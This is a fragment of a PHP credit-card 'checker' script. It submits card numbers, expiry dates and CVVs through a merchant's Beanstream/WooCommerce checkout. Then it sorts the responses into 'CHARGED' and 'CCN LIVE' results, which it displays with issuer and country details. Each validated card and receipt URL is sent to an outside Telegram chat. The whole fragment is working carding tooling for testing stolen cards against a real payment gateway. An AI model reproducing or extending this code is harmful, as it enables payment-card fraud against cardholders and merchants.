...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'beanstream_ccnum' => $cc,
    'beanstream_expmonth' => $mes_with_zero,
    'beanstream_expyear' => $ano_no_20,
    'beanstream_cvv' => $cvv,

    'beanstream-card-number' => $cc,
    'beanstream-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'beanstream-card-cvc' => $cvv,

    'wc-beanstream-account-number' => $cc,
    'wc-beanstream-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'wc-beanstream-csc' => $cvv,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED BEANSTREAM]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
    
} elseif (strpos($msg, 'CVV2 DECLINED') !== false || strpos($msg, 'Declined by Processor or Issuer - CVV2 Value supplied is invalid.') !== false) {
    ...
    <span style="color: #daff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CCN]- $lista [CCN LIVE BEANSTREAM]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
